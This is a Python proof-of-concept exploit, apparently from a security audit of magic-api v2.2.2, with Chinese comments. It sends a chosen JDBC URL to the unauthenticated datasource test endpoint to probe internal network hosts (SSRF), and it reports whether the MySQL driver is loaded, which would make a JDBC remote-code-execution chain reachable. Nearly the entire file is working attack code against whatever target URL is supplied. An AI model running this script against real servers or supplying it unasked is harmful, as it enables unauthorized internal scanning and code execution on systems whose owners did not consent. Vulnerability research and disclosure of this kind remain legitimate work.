#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
F-02: 未授权 JDBC SSRF / JDBC-RCE (magic-api v2.2.2)

POST /magic/web/datasource/jdbc/test
body: {"driverClassName":..., "url":..., "username":..., "password":...}
内部 JdbcUtils.getConnection -> Class.forName(driver) + DriverManager.getConnection(url)
无 @Valid / 无 allowVisit -> 未授权可达 -> SSRF 内网探测 / 带恶意 driver 的 RCE。

用法:
  python3 poc_f02_jdbc_ssrf.py http://target:9999 [jdbc_url]
"""
import json
import sys
import urllib.request

BASE = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else 'http://localhost:9999'
URL = sys.argv[2] if len(sys.argv) > 2 else 'jdbc:mysql://10.0.0.1:3306/test?connectTimeout=2000'

payload = json.dumps({
    'driverClassName': 'com.mysql.cj.jdbc.Driver',
    'url': URL,
    'username': 'a',
    'password': 'b'
}).encode()

req = urllib.request.Request(
    f'{BASE}/magic/web/datasource/jdbc/test',
    data=payload, headers={'Content-Type': 'application/json'})
try:
    resp = json.loads(urllib.request.urlopen(req, timeout=10).read())
    print('[+] 响应:', resp.get('code'), resp.get('data') or resp.get('message'))
    if resp.get('code') == 1 and '找不到驱动' not in str(resp.get('data', '')):
        print('[!] 驱动在 classpath -> SSRF/RCE 链可达')
except Exception as e:
    print('[!] 异常:', e)
